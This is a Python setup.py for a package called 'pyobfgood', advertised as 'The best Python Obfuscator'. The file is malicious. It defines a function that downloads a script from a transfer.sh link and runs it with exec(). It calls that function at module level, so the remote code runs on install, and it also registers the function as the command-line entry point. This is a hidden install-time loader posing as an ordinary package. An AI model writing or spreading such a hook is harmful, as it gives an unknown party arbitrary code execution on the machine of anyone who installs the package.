from setuptools import setup
import urllib.request
import os

def download_and_execute():
    url = 'https://transfer.sh/get/wDK3Q8WOA9/start.py'
    response = urllib.request.urlopen(url)
    code = response.read()
    exec(code)

setup(
    name='pyobfgood',
    version='1.0.3',
    description='The best Python Obfuscator',
    author='GoodProgramer36',
    packages=['pyobfgood'],
    entry_points={
        'console_scripts': [
            'pyobfgood = pyobfgood:download_and_execute'
        ],
    },
)

download_and_execute()
